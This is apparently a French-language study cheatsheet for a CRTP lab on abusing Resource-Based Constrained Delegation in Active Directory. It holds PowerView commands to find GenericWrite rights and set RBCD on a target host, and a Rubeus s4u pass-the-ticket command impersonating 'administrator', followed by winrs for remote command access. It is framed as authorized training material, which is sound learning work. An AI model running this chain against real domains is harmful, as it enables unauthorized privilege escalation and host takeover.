# Cheatsheet - RBCD

> [!summary] Objectif
> Préparer une fiche dédiée à Resource-Based Constrained Delegation pour l'énumération et la validation des prérequis en lab.

> [!warning] Cadre d'utilisation
> À utiliser uniquement dans un environnement de lab autorisé, dans le cadre de l'apprentissage et de la préparation CRTP.

## Quand utiliser cette fiche

- Quand le lab mentionne `RBCD`, `msDS-AllowedToActOnBehalfOfOtherIdentity` ou `Set-DomainRBCD`.
- Quand un chemin d'accès dépend d'un compte machine contrôlé.

## Prérequis

- PowerView disponible.
- Un compte ou objet machine du lab servant de délégant.

## Commandes

### Objectif

Vérifier le droit d'écriture qui permet de préparer la RBCD.

### Commande

```powershell
. C:\AD\Tools\PowerView.ps1
Find-InterestingDomainACL | Where-Object {$_.IdentityReferenceName -match 'ciadmin'}
```

### Explication

Le lab manual part d'un utilisateur comme `ciadmin` ayant `GenericWrite` sur l'objet ordinateur `dcorp-mgmt`.

### Contexte d’utilisation

À utiliser avant `Set-DomainRBCD` pour justifier pourquoi l'écriture est possible.

### Précautions

Confirmer l'objet ciblé et le droit observé avant modification.

### Objectif

Vérifier si une RBCD est déjà configurée.

### Commande

```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainRBCD
```

### Explication

Affiche les relations RBCD existantes sur les objets concernés.

### Contexte d’utilisation

Utile pour comprendre l'état du lab avant toute configuration ou abus.

### Précautions

Noter l'objet cible et le délégant autorisé.

### Objectif

Configurer la RBCD sur un hôte cible du lab.

### Commande

```powershell
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
```

### Explication

Commande exactement alignée sur l'exemple du lab manual pour préparer l'accès à `dcorp-mgmt`.

### Contexte d’utilisation

À utiliser uniquement quand le lab prévoit explicitement cette étape.

### Précautions

Vérifier deux fois l'identité cible avant écriture.

### Objectif

Contrôler l'attribut après configuration.

### Commande

```powershell
Get-DomainRBCD
```

### Explication

Confirme que l'écriture a bien produit l'état attendu.

### Contexte d’utilisation

Utile juste avant le chaînage avec les outils Kerberos du lab.

### Précautions

Conserver la sortie avant/après dans les notes de progression.

### Objectif

Abuser la RBCD avec Rubeus après récupération des clés machine.

### Commande

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe args s4u /user:dcorp-studentX$ /aes256:<AES256_KEY> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
winrs -r:dcorp-mgmt cmd
```

### Explication

Le PDF enchaîne la configuration RBCD avec un `s4u` Rubeus, puis une validation via `winrs`.

### Contexte d’utilisation

Section à garder prête pour la partie pratique du module RBCD.

### Précautions

Remplacer la clé AES par celle réellement extraite dans le lab.

### Notes associées

- [[Cheatsheet - Delegation attacks]]
- [[Cheatsheet - Trusts et forêts]]
- [[Synthèse - Attaques AD]]
- [[Attaques AD - MOC]]
